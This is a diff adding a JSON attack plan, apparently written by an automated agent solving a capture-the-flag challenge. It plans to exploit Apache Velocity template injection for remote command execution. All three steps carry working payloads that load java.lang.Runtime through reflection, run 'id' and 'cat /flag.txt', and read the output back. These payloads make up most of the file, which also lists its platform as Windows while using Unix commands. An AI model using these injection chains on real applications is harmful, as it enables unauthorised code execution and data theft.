@@ -1,0 +1,156 @@
+{
+  "version": 1,
+  "plan_id": "plan-velocity-ssti-rce-20250315-001",
+  "vuln_summary": "Apache Velocity SSTI in Labyrinth Linguist allows RCE via 'text' parameter. Arithmetic probe confirmed execution (49), but complex RCE payloads failed due to reflection. Need to use a minimal, robust payload to execute commands and capture output.",
+  "rationale": "Previous attempts with complex payloads failed because they were reflected verbatim, likely due to syntax errors or encoding issues. The arithmetic probe #set($x=7*7)$x worked, proving template execution. I will use a minimal payload that leverages the confirmed execution to read a file directly via Runtime.exec, avoiding complex reflection chains. The payload will use a simple command like 'cat /flag.txt' or 'id' and capture output via a BufferedReader. I will also try a simpler approach using the ClassLoader to load Runtime, which is more reliable in Velocity 1.7.",
+  "chain_design": {
+    "current_primitive": "ssti_reflection",
+    "target_primitive": "command_execution",
+    "transitions": [
+      "ssti_reflection -> ssti_execution (confirmed)",
+      "ssti_execution -> command_execution (attempting)"
+    ]
+  },
+  "steps": [
+    {
+      "id": 1,
+      "status": "PLANNED",
+      "type": "python",
+      "purpose": "Execute 'id' command via Velocity SSTI using a minimal payload with ClassLoader to load Runtime and capture output.",
+      "expected_outcome": "Response contains 'uid=' or similar command output, confirming RCE.",
+      "depends_on": [],
+      "on_failure": "BLOCK_AND_DEBUG",
+      "why_this_step_advances_state": "Moves from ssti_execution to command_execution by successfully executing a system command.",
+      "why_this_payload_is_a_mutation": "Uses ClassLoader to load Runtime instead of direct class.forName, which may bypass restrictions and is simpler.",
+      "why_this_is_not_regression": "Previous payloads used complex reflection chains; this one is minimal and uses a different class loading approach.",
+      "target_primitive": "command_execution",
+      "why_this_primitive_advances_chain": "Command execution is a direct step towards file read and flag retrieval.",
+      "sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($s='')#set($loader=$s.getClass().getClassLoader())#set($rt=$loader.loadClass('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))#set($is=$ex.getInputStream())#set($br=$s.getClass().forName('java.io.BufferedReader').getConstructor($s.getClass().forName('java.io.Reader')).newInstance($s.getClass().forName('java.io.InputStreamReader').getConstructor($s.getClass().forName('java.io.InputStream')).newInstance($is))#set($line=$br.readLine())$line"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_imports": [],
+      "_ast_sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($s='')#set($loader=$s.getClass().getClassLoader())#set($rt=$loader.loadClass('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))#set($is=$ex.getInputStream())#set($br=$s.getClass().forName('java.io.BufferedReader').getConstructor($s.getClass().forName('java.io.Reader')).newInstance($s.getClass().forName('java.io.InputStreamReader').getConstructor($s.getClass().forName('java.io.InputStream')).newInstance($is))#set($line=$br.readLine())$line"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_valid": true
+    },
+    {
+      "id": 2,
+      "status": "PLANNED",
+      "type": "python",
+      "purpose": "If step 1 fails, try a simpler payload using Runtime.exec with direct class.forName and read output via Scanner.",
+      "expected_outcome": "Response contains command output, confirming RCE.",
+      "depends_on": [
+        1
+      ],
+      "on_failure": "BLOCK_AND_DEBUG",
+      "why_this_step_advances_state": "Alternative attempt to achieve command execution.",
+      "why_this_payload_is_a_mutation": "Uses Scanner instead of BufferedReader, which may be more compatible with Velocity 1.7.",
+      "why_this_is_not_regression": "Different output reading mechanism, not a repeat of previous failed payloads.",
+      "target_primitive": "command_execution",
+      "why_this_primitive_advances_chain": "Command execution is essential for file read and flag retrieval.",
+      "sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($s='')#set($rt=$s.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))#set($sc=$s.class.forName('java.util.Scanner').getConstructor($s.class.forName('java.io.InputStream')).newInstance($ex.getInputStream()))#set($line=$sc.nextLine())$line"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_imports": [],
+      "_ast_sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($s='')#set($rt=$s.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))#set($sc=$s.class.forName('java.util.Scanner').getConstructor($s.class.forName('java.io.InputStream')).newInstance($ex.getInputStream()))#set($line=$sc.nextLine())$line"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_valid": true
+    },
+    {
+      "id": 3,
+      "status": "PLANNED",
+      "type": "python",
+      "purpose": "If command execution works, read the flag file using 'cat /flag.txt' or similar.",
+      "expected_outcome": "Response contains the flag content.",
+      "depends_on": [
+        1,
+        2
+      ],
+      "on_failure": "BLOCK_AND_DEBUG",
+      "why_this_step_advances_state": "Achieves the final objective of file read and flag retrieval.",
+      "why_this_payload_is_a_mutation": "Uses the same execution mechanism but with a different command to read the flag.",
+      "why_this_is_not_regression": "Builds on successful command execution, not a repeat of failed attempts.",
+      "target_primitive": "file_read",
+      "why_this_primitive_advances_chain": "File read is the final step to obtain the flag.",
+      "sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($s='')#set($loader=$s.getClass().getClassLoader())#set($rt=$loader.loadClass('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('cat /flag.txt'))#set($is=$ex.getInputStream())#set($br=$s.getClass().forName('java.io.BufferedReader').getConstructor($s.getClass().forName('java.io.Reader')).newInstance($s.getClass().forName('java.io.InputStreamReader').getConstructor($s.getClass().forName('java.io.InputStream')).newInstance($is))#set($line=$br.readLine())$line"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_imports": [],
+      "_ast_sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($s='')#set($loader=$s.getClass().getClassLoader())#set($rt=$loader.loadClass('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('cat /flag.txt'))#set($is=$ex.getInputStream())#set($br=$s.getClass().forName('java.io.BufferedReader').getConstructor($s.getClass().forName('java.io.Reader')).newInstance($s.getClass().forName('java.io.InputStreamReader').getConstructor($s.getClass().forName('java.io.InputStream')).newInstance($is))#set($line=$br.readLine())$line"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_valid": true
+    }
+  ],
+  "history_state": {
+    "rounds": 16,
+    "state": "gadget_triggered",
+    "chain": [
+      "init",
+      "probe_success",
+      "payload_injected"
+    ]
+  },
+  "primitive_context": {
+    "current_primitive": "ssti_reflection",
+    "confirmed_primitives": [
+      "ssti_execution"
+    ],
+    "target_primitive": "command_execution"
+  },
+  "imports": [
+    "json",
+    "re",
+    "base64",
+    "hashlib",
+    "hmac",
+    "struct",
+    "http.cookies"
+  ],
+  "sdk_calls": [],
+  "platform": "Windows"
+}
